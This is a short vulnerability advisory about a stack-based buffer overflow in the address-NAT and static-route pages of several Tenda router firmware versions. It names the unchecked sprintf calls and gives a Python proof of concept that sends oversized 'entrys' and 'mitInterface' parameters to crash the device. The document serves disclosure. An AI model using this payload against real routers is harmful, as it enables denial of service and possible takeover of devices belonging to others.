# Tenda routerstatic api vulnerability
These vulnerability lie in the /goform/addressNat or /goform/RouteStatic page which influence the device: FH452, F451, F453, CH22. And influence the lastest version of
FH451_V1.0.0.5,  FH451_V1.0.0.7, FH451_V1.0.0.9, F451_V1.0.0.7, F451_V1.0.0.9, F453_V1.0.0.3, CH22_V1.0.0.1. 
## Vulnerability Description
There is a stack-based buffer overflow vulnerability in function fromAddressNat or fromRouteStatic.
The example is as follows:

In function `fromAddressNat` it reads 2 user provided parameters `entrys` and `mitInterface` into `v8` and `v7`, and these two variables are passed into function `sprintf` without any length check, which may overflow the stack-based buffer `s`.
![](https://github.com/Funcy33/Vluninfo_Repo/blob/main/CNVDs/all/vlun.png)

So by requesting the page `/goform/addressNat`, the attacker can easily perform a **Deny of Service Attack** or **Remote Code Execution** with carefully crafted overflow data.
## PoC
For example:
```
import requests

IP = "10.10.10.1"
url = f"http://{IP}/goform/addressNat?"
url += "entrys=" + "s" * 0x200
url += "&mitInterface=" + "a" * 0x200

response = requests.get(url)
```
## Timeline
## Acknowledgment
Credit to @XYlearn and @Funcy_kilar from Fudan University, Guangzhou University.
